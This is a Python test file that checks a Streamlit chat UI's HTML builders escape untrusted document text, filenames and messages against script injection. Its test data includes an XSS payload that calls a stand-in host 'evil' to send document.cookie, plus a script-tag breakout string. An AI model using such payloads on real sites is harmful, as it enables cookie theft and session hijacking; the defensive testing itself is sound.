"""
tests/test_ui_escaping.py
─────────────────────────
Document-driven XSS guard.

ui.py renders with unsafe_allow_html=True. Any document text, filename, or
user message interpolated into that HTML raw is a script-injection vector: a
PDF whose text contains <img src=x onerror=...> would execute JS when its chunk
is shown in the sources panel.

These test the pure HTML builders directly — no Streamlit runtime needed. The
builders are the exact strings handed to st.markdown(..., unsafe_allow_html=True),
so if the payload is neutralised here it is neutralised on screen.
"""

from src.ui import (
    _esc,
    _user_bubble_html,
    _assistant_bubble_html,
    _source_block_html,
    _file_row_html,
)

# The canonical document-driven payload: fires on render, exfiltrates cookies.
XSS = '<img src=x onerror="fetch(\'http://evil/?c=\'+document.cookie)">'
BREAKOUT = '"><script>alert(1)</script>'


def assert_neutralised(rendered_html: str):
    """
    No executable markup survived. The payload text may still be VISIBLE (that's
    the point — the user should see what the document contained), but every
    tag-opening '<' from the payload must be escaped to '&lt;'. Once the '<' is
    gone, leftover 'onerror='/'script' substrings are inert text, not markup.
    """
    # The injected tags must not exist as real tags.
    assert "<img" not in rendered_html
    assert "<script" not in rendered_html
    # ...but they DO survive in escaped, inert form, so nothing was swallowed.
    assert "&lt;img" in rendered_html or "&lt;script" in rendered_html


def test_source_block_escapes_document_content():
    """The headline vulnerability: malicious chunk text in the sources panel."""
    src = {"source_file": "notes.txt", "text": "Chapter 1. " + XSS, "page_number": 3}
    out = _source_block_html(1, src)
    assert_neutralised(out)
    # The surrounding chrome is intact — only the value was escaped.
    assert 'class="source-crt"' in out
    assert "REF 1:" in out
    assert "PG.3" in out


def test_source_block_escapes_malicious_filename():
    """A PDF can carry its payload in the filename, not just the body."""
    src = {"source_file": XSS, "text": "harmless body text", "page_number": None}
    out = _source_block_html(2, src)
    assert_neutralised(out)


def test_user_message_is_escaped():
    out = _user_bubble_html(XSS)
    assert_neutralised(out)
    assert 'class="bubble-user"' in out


def test_filename_row_is_escaped():
    finfo = {"name": XSS, "size_bytes": 2048, "is_indexed": True}
    out = _file_row_html(finfo)
    assert_neutralised(out)
    assert "2KB" in out  # benign numeric field still rendered


def test_attribute_breakout_is_escaped():
    """Quote-based break-out must not escape the attribute/tag context."""
    out = _source_block_html(1, {"source_file": BREAKOUT, "text": BREAKOUT, "page_number": None})
    assert "<script" not in out
    assert "<script>alert(1)</script>" not in out
    # The raw quote that would close an HTML attribute is escaped to inert form.
    assert "&quot;" in out


def test_assistant_formatting_preserved():
    """
    Assistant output is trusted for FORMATTING (newlines -> <br>) but still
    escaped, so a document quoted back by the model can't inject either.
    """
    out = _assistant_bubble_html("Line one\nLine two")
    assert "<br>" in out, "newline formatting was dropped"
    assert "Line one" in out and "Line two" in out

    dangerous = _assistant_bubble_html("see <script>alert(1)</script>")
    assert "<script" not in dangerous
    assert "&lt;script&gt;" in dangerous


def test_benign_text_is_readable():
    """Ordinary content must not be mangled by over-escaping."""
    src = {"source_file": "guide.txt",
           "text": "Prisma error P2002 maps to 409 Conflict.",
           "page_number": 1}
    out = _source_block_html(1, src)
    assert "Prisma error P2002 maps to 409 Conflict." in out
    assert "guide.txt" in out


def test_esc_handles_non_strings():
    """_esc must tolerate whatever gets passed (e.g. a None or an int)."""
    assert _esc(42) == "42"
    assert _esc(None) == "None"
